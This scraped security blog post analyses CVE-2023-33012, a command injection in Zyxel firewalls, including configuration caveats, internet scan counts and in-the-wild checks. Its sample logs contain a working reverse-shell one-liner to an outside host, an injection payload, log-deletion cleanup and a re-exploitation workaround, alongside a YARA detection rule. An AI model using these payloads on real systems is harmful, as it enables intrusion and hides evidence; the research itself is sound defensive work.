---
title: "re Zyxel VPN Series Pre-auth Remote Command Execution - Blog - VulnCheck"
date: 2024-02-21T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# re Zyxel VPN Series Pre-auth Remote Command Execution - Blog - VulnCheck

<br/>

<br/>
::check-list\\n---\\ntitle: Key Takeaways\\nico: mdi:check-bold\\nlist:\\n - An unauthenticated command injection exploit affecting Zyxel firewalls was published in late January without an associated CVE. The vulnerability turns out to be CVE-2023-33012.\\n - The associated disclosure did not mention any caveats to exploitation, but it turns out only an uncommon configuration is affected. There are currently about 600 internet-facing Zyxel firewalls vulnerable to this issue (out of ~26,000).\\n - Unless the attacker takes specific measures, the exploit will only work on a target once.\\n - There is no evidence of exploitation in the wild. \\n---\\n::\\n\\n## Introduction\\n\\nOn January 25, 2024, SSD Secure Disclosure posted a disclosure titled \[Zyxel VPN Series Pre-auth Remote Command Execution\](https://ssd-disclosure.com/ssd-advisory-zyxel-vpn-series-pre-auth-remote-command-execution/). The writeup describes an unauthenticated remote command injection vulnerability affecting Zyxel VPN firewalls. That caught our attention. The Zyxel VPN series has appeared on the CISA KEV four times now, and the \[original\](https://web.archive.org/web/20240204213745/https://ssd-disclosure.com/ssd-advisory-zyxel-vpn-series-pre-auth-remote-command-execution/) disclosure didn’t mention a CVE. We were very interested in the implied inadvertent patching and wanted to figure out if the vulnerability had been exploited in the wild.\\n\\nWe quickly learned from Zyxel PSIRT that this was not inadvertently patched. They assigned \[CVE-2023-33012\](https://nvd.nist.gov/vuln/detail/CVE-2023-33012) in an \[advisory\](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities-in-firewalls-and-wlan-controllers) published in July 2023. The advisory credits \[TRAPA Security\](https://trapa.tw/) for discovering the vulnerability and clarifies the issue \*\*is not\*\* isolated to VPN series. They listed the following affected models:\\n\\n| Product | Affected Versions |\\n| -------- | ------- |\\n| ATP | V5.10 through V5.36 Patch 2 |\\n| USG FLEX | V5.00 through V5.36 Patch 2 |\\n| USG FLEX 50(W) / USG20(W)-VPN | V5.10 through V5.36 Patch 2 |\\n| VPN | V5.00 through V5.36 Patch 2 |\\n\\nThe affected models list is important because it demonstrates a significantly larger target set than SSD described. Shodan earmarks about \[2,500\](https://www.shodan.io/search?query=title%3A%22VPN50%22%2C%22VPN100%22%2C%22VPN300%22%2C%22VPN1000%22+%2Bhtml%3A%22zyFunction.js%22+%2B%22Pragma%22) internet-facing VPN series firewalls, but there are about \[26,000\](https://www.shodan.io/search?query=title%3A%22USG+FLEX%22%2C%22ATP100%22%2C%22ATP100W%22%2C%22ATP200%22%2C%22ATP500%22%2C%22ATP700%22%2C%22ATP800%22%2C%22VPN50%22%2C%22VPN100%22%2C%22VPN300%22%2C%22VPN1000%22+%2Bhtml%3A%22zyFunction.js%22+%2B%22Pragma%22) instances of all the models combined. \\n\\nZyxel also provided a much wider affected range. Really, SSD provides two conflicting ranges. They write:\\n\\n> The affected models are VPN50, VPN100, VPN300, VPN500, and VPN1000. The affected firmware version is 5.21 thru to 5.36.\\n\\nBut their proof of concept checks for versions greater than or equal to 5.10:\\n\\n\`\`\`python\\nif not title.startswith("VPN") or version == "" or float(version) < 5.10:\\n print("\[-\] invulnerable target")\\n return\\n\`\`\`\\n\\nAssuming the Zyxel version range is correct, we scanned the internet for exposed Zyxel firewalls using the affected ranges. We found ~7,600 firewalls (or about 33% of the firewalls that responded to our version scan) using firmware versions that are affected by CVE-2023-33012. \\n\\n> Internet-Facing Zyxel Firewalls Using Versions Affected by CVE-2023-33012\\n\\n::pie-chart\\n---\\nlabels:\\n - Patched\\n - Unpatched\\nvalues:\\n - 15190\\n - 7597\\n---\\n::\\n\\nFor an offensive-minded individual, 7600 firewalls are still a decent target set, especially when a patch/advisory had been published for six months. VulnCheck is full of offensive-minded individuals, and we just so happen to have a Zyxel USG FLEX in inventory (see previous statement about Zyxel firewalls in KEV). So, we started developing our own exploit.\\n\\nBut we swiftly ran into a wall.\\n\\nSSD presents this vulnerability as a straightforward file upload and command injection. It is not. It both requires a special configuration and, unless the attacker knows what they are doing, can only work once. \\n\\n## Configuration Required\\n\\nThe first hint that exploitation is not going to work right out of the box is from the CVE entry itself.\\n\\n> attacker to execute some OS commands by using a crafted GRE configuration when the cloud management mode is enabled.\\n\\nCloud Management Mode (SD-WAN mode) is not enabled by default. So, by default, Zyxel firewalls are not vulnerable to this issue. This can be easily verified using the vulnerable endpoint itself. The following is an edited (for brevity) version of \`/ztp/cgi-bin/parse\_config.py\` from USG FLEX 5.36.2:\\n\\n\`\`\`python\\ndef main():\\n form = cgi.FieldStorage()\\n conf\_str = form.getvalue("config")\\n \\n print("Status: 200 OK")\\n print("Content-type: text/html")\\n print("")\\n \\n if conf\_str is None:\\n conf\_str = ''\\n else:\\n if not os.path.exists(ztpinclude.SERVER\_SOCK\_FILE):\\n logging.error("Cannot find sdwan\_interface socket \[%s\]!" % ztpinclude.SERVER\_SOCK\_FILE)\\n print("ParseError: 0xC0DE0005")\\n else:\\n\`\`\`\\n\\nThe important part is the check for \`ztpinclude.SERVER\_SOCK\_FILE\`. If this file does not exist, the script sends the client the error code \`ParseError: 0xC0DE0005\` and then exits. This means it will never hit the vulnerable code path when that file doesn’t exist. \`ztpinclude.SERVER\_SOCK\_FILE\` only exists when cloud management mode is enabled.\\n\\nThat begs the question, \*“How many Zyxell firewalls using vulnerable firmware have cloud management mode enabled?”\* It turns out that is easy to determine as well. \`/ztp/cgi-bin/parse\_config.py\` expects the caller to send base64 encoded content in the config parameter. If the script receives invalid base64 encoded data, then it will respond to the client with the error code \`ParseError: 0xC0DE0004\`. See the code below:\\n\\n\`\`\`python\\nif not os.path.exists(ztpinclude.SERVER\_SOCK\_FILE):\\n logging.error("Cannot find sdwan\_interface socket \[%s\]!" % ztpinclude.SERVER\_SOCK\_FILE)\\n print("ParseError: 0xC0DE0005")\\nelse:\\n conf\_str = urllib.unquote(conf\_str) \\n try:\\n decoded\_config = base64.b64decode(conf\_str)\\n except:\\n logging.error("invalid base64 str %s" % conf\_str)\\n print("ParseError: 0xC0DE0004")\\n return\\n\`\`\`\\n\\nIn that way, we were able to scan the internet-facing Zyxel devices to determine how many used the vulnerable configuration. Of the ~7,600 that were using vulnerable firmware, we found only 607 that were using the vulnerable configuration.\\n\\n> Configuration of Zyxel Firewalls Using Firmware Affected By CVE-2023-33012\\n\\n::pie-chart\\n---\\nlabels:\\n - SD-WAN Disabled (Not Vulnerable)\\n - SD-WAN Enabled\\nvalues:\\n - 6990\\n - 607\\n---\\n::\\n\\nFrom the initial analysis, we went all the way from “Zyxel firewalls are affected by an unauthenticated remote command injection” to “Zyxel firewalls using an uncommon configuration are affected by unauthenticated remote command injection.” Which is a pretty important asterisk that got left out.\\n\\nBut that’s not the only caveat. There’s more.\\n\\n## You Get One Shot\\n\\nThe exploitation described by SSD is clever and fun to play with. The attacker can write arbitrary data to a file of their choosing using the \`option proto vti\` configuration (which Zyxel did not appear to fix in the 5.37.0 release). The attacker can then execute the file using a command injection in the \`option proto gre\` configuration. The command injection is space-limited to the point that executing a pre-upload file is the only option, so these two things work really well together.\\n\\nThe problem is that you can only do it once.\\n\\nLooking at (edited) \`ps faux\` after exploitation, we see the following:\\n\\n\`\`\`sh\\nroot 14602 S 07:14 0:00 sh -c ip addr add ; . /tmp/fYW.qsr; #/24 brd + dev gre1\\nroot 14606 S 07:14 0:00 \\\_ sh -i\\nroot 14649 R 07:14 0:00 | \\\_ ps faux\\nroot 14607 S 07:14 0:00 \\\_ openssl s\_client -quiet -connect 10.12.70.252:1271\\n\`\`\`\\n\\nThe injection occurs during an attempted \`ip addr /24 brd + dev gre1\` command. The offending code from \`/usr/sbin/sdwan\_interface\` is easy to visualize in a decompiler. The order of operations turns out to be very important, but below, you can see the software brings up the GRE interface, sets the multicast transmit queue size, and auto-configures the broadcast address (where exploitation finally occurs):\\n\\n!\[Decompiled output from sdwan\_interface\](/blog/zyxel-cve-2023-33012/decompiled-CVE-2023-33012.png){:width="100%"}\\n\\nUpon failure of the final command, the following is logged to \`/tmp/sdwan\_interface/sdwan\_interface.log\`:\\n\\n\`\`\`\\n\[Fri Feb 16 19:58:49 2024\] \[zld\_interface\_server:806\] name=xBwHq, reset\_interface=1\\n\[Fri Feb 16 19:58:50 2024\] \[add\_gre\_tunnel:435\] add\_gre\_tunnel \[ERROR\]: cmd error\[32512\]: ip addr add ; . /tmp/MGb.qsr; #/24 brd + dev gre1\\n\[Fri Feb 16 19:58:50 2024\] \[apply\_zone\_to\_kernel:22\] apply zone to kernel = 1, 21, gre1\\n\`\`\`\\n\\nThe logging and decompilation screenshots are important because they provide evidence of why this vulnerability \*can only be exploited once\*. A subsequent exploit attempt generates the following log:\\n\\n\`\`\`\\n\[Fri Feb 16 20:10:59 2024\] \[zld\_interface\_server:806\] name=XsDfb, reset\_interface=1\\n\[Fri Feb 16 20:10:59 2024\] \[add\_gre\_tunnel:420\] add\_gre\_tunnel \[ERROR\]: cmd error\[65280\]: ifconfig gre2 up\\n\[Fri Feb 16 20:10:59 2024\] \[apply\_zone\_to\_kernel:22\] apply zone to kernel = 1, 21, gre2\\n\`\`\`\\n\\nHere we see that the firewall has attempted operations on a new GRE interface (\`gre2\`), but the command \`ifconfig gre2 up\` fails. The interface doesn’t exist. When \`ifconfig gre2 up\` fails, \`ip addr add\` is never executed. The first successful exploitation leaves the firewall in a state where it cannot be exploited again! This important caveat was certainly never mentioned.\\n\\nAn attacker who knows what they are doing \*can\* work around this limitation. If the attacker removes the old GRE interface, the software will bring up a new one. Our post-exploitation script has something like:\\n\\n\`\`\`sh\\nifconfig gre1 down; ip tunnel del gre1 mode gre;\\n\`\`\`\\n\\nThe next time the target is exploited, it will successfully create \`gre2\`, which allows \`ifconfig gre2 up\` to run successfully and open up access to the vulnerable command.\\n\\n## Exploitation in the Wild\\n\\nThe SSD writeup \[gained\](https://www.reddit.com/r/netsec/comments/19f9q8c/new\_zyxel\_rce\_vulnerability\_allows\_remote/) \[some\](https://twitter.com/ptracesecurity/status/1751289074537619646) attention, so we were interested if anyone attempted to exploit this in the wild. For whatever reason, the firewalls make the ZTP log available to remote and unauthenticated users through the \`/ztp/cgi-bin/dumpztplog.py\` endpoint. In that log file, an exploitation attempt will look something like this:\\n\\n\`\`\`\\nINFO:root:ztp\_led\_start\\nINFO:root:sending "1"\\nINFO:root:closing socket\\nINFO:root:init\\nINFO:root:setting up vti interface\\nINFO:root:((cd=/tmp; mknod Hua p; sh -i < Hua 2>&1 | openssl s\_client -quiet -connect 10.12.70.252:1270 > Hua; rm Hua;)&);((sleep 20; ifconfig gre1 down; ip tunnel del gre1 mode gre; rm /var/log/ztplog /tmp/sdwan\_interface/sdwan\_interface.log /tmp/\*.qsr)&);; name=EAg; proto=vti\\nINFO:root:parse config error : {'((cd': '/tmp; mknod Hua p; sh -i < Hua 2>&1 | openssl s\_client -quiet -connect 10.12.70.252:1270 > Hua; rm Hua;)&);((sleep 20; ifconfig gre1 down; ip tunnel del gre1 mode gre; rm /var/log/ztplog /tmp/sdwan\_interface/sdwan\_interface.log /tmp/\*.qsr)&);', 'name': 'EAg', 'proto': 'vti'}\\nINFO:root:KeyError('ipaddr',)\\nINFO:root:ztp\_led\_start\\nINFO:root:sending "1"\\nINFO:root:closing socket\\nINFO:root:init\\nINFO:root:setting up gre interface\\nINFO:root:name=XsDfb; proto=gre; ipaddr=; . /tmp/EAg.qsr; #; localip=127.0.0.1; netmask=24; remoteip=127.0.0.1; gateway=0\\n\[IPC\]argc = 8\\n\[IPC\]IPC result: 1 \\n\`\`\`\\n\\nAbove, you can see both the file write (line ending with \`proto=vti\`) and the command injection (line ending with \`gateway=0\`) are present. A very simple YARA rule to parse the logs for exploitation looks like:\\n\\n\`\`\`\\nrule Zyxel\_CVE\_2023\_33012\\n{\\n meta:\\n description = "Zyxel ZTP Config Parser Exploit Attempt"\\n path\_pattern = "/ztp/cgi-bin/dumpztplog.py"\\n strings:\\n $vti = "proto=vti"\\n $gre = "proto=gre"\\n $tmp = "/tmp/"\\n $qsr = ".qsr"\\n condition:\\n all of them\\n}\\n\`\`\`\\n\\nWe grabbed the ZTP logs of all ~7,600 firewalls using vulnerable firmware and found… absolutely nothing that looked like an exploitation attempt. Of course, the ZTP log is deleted on reboot (and an attacker can delete on exploitation), but this seems like a reasonable indicator that it isn’t being widely exploited.\\n\\nWe did find 18,000+ log entries that read, \`ERROR:root:Cannot find sdwan\_interface socket \[/tmp/sdw\_iface\_server.sock\]!\` This does prove the interface is seeing traffic, but because those endpoints aren’t vulnerable, we see nothing more in the logs.\\n\\nAs a final attempt to determine if this is being actively exploited in the wild, we turned to our friends at GreyNoise. Looking at \`raw\_data.web.paths:"/ztp/cgi-bin/parse\_config.py”\` shows \[no results\](https://viz.greynoise.io/query/raw\_data.web.paths:%22%2Fztp%2Fcgi-bin%2Fparse\_config.py%22), so they aren’t seeing the exploit hit their honeypots. They do see one IP address doing Zyxel version probing via \`zld\_product\_spec.js\` just like the SSD proof of concept, but that's about it. \\n\\n!\[GreyNoise flagged IP scanning for Zyxel\](/blog/zyxel-cve-2023-33012/greynoise-zyxel-scanning.png){:width="100%"}\\n\\nThere’s basically no evidence that this vulnerability is being exploited in the wild at any scale, and with so few vulnerable targets remaining, we assume it never will be.\\n\\n## Conclusion\\n\\nThe goal of vulnerability disclosure should be to inform and provide actionable intelligence. Publishing incorrect, obfuscated, and/or misleading information wastes everyone’s time and only introduces more FUD to an industry that is already drowning in it. This Zyxel firewall issue did not live up to the disclosure. It only affects a specific configuration, is not easy to re-exploit, and was assigned a CVE when patched six months ago. Most Zyxel users needn’t have ever worried about it.\\n\\n## About VulnCheck\\n\\nThe VulnCheck Initial Access team is always looking to advance the state of attack on initial access vulnerabilities. For more research like this, see our blogs, \[PaperCut Exploitation\](https://vulncheck.com/blog/papercut-rce) and \[Fileless Remote Code Execution on Juniper Firewalls\\n\](https://vulncheck.com/blog/juniper-cve-2023-36845). Sign up to start a trial of our \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) and \[Exploit & Vulnerability Intelligence\](https://vulncheck.com/product/exploit-intelligence) product today.\\n

#### [Source](https://vulncheck.com/blog/zyxel-cve-2023-33012)

<br/>
---
